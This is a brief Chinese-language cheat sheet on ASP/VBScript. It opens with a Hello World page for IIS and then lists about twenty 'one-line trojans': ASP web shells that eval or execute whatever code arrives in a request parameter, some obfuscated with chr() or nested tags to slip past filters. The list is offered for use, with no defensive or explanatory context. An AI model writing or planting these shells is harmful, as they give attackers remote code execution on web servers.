一般VBscript语言

加入勾选了asp的iis的index.asp访问/index.asp即可。
```
<%@ Language=VBScript %>
<!DOCTYPE html>
<html>
<head>
    <title>ASP Hello World</title>
</head>
<body>
    <%
    Response.Write "Hello, World!"
    %>
</body>
</html>
```

一句话木马
```
<%eval request ("mbg")%>

<%execute request("c")%>

<%execute(request("c"))%>

<%ExecuteGlobal request("sb")%>

%><%Eval(Request(chr(35)))%><%

<%if request ("c")<>""then session("c")=request("c"):end if:if session("c")<>"" then execute session("c")%>

<%eval(Request.Item["c"],"unsafe");%>

<%eval(request("c")):response.end%>

<%execute request("c")%><%<%loop<%:%>
<%<%loop<%:%><%execute request("c")%>
<%execute request("c")<%loop<%:%>

<%if Request("c")<>"" ThenExecuteGlobal(Request("c"))%>

<%eval request(chr(35))%>

<%eval(Request.Item["r00ts"],”unsafe”);%>

<%IfRequest(“1″)<>”"ThenExecuteGlobal(Request(“1″))%>

<%execute request(“class”)%><%'<% loop <%:%><%'<% loop <%:%><%execute request(“class”)%><%execute request(“class”)'<% loop <%:%>

<%dy=request("c")%><%Eval(dy)%> 

<script language=VBScript runat=server>execute request("c")</script>

<script language=vbs runat=server>eval(request("c"))</script>

<script language=vbs runat=server>eval_r(request("c"))</script>
```